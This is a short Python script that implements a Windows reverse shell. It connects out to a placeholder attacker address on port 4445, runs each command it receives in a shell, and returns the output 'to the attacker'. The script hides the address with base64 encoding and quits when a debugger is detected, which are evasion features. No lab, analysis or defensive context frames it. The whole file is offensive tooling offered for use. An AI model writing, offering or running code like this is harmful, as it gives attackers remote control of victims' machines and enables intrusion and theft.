import socket
import subprocess
import os
import base64
import ctypes
import sys

# Obfuscation
def encode_string(s):
    return base64.b64encode(s.encode()).decode()

# Reverse shell configuration
LHOST = encode_string('your_ip_address')  # Replace with your IP address
LPORT = 4445  # Replace with your desired port

# Anti-debugging
def is_debugger_present():
    return ctypes.windll.kernel32.IsDebuggerPresent() != 0

if is_debugger_present():
    sys.exit(0)

# Create a socket object
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the reverse shell
sock.connect((base64.b64decode(LHOST).decode(), LPORT))

# Receive commands from the attacker
while True:
    command = sock.recv(1024).decode()
    
    if command == 'exit':
        break
    
    # Execute the command
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    output = process.stdout.read() + process.stderr.read()
    
    # Send the output back to the attacker
    sock.send(output)

# Close the socket
sock.close()
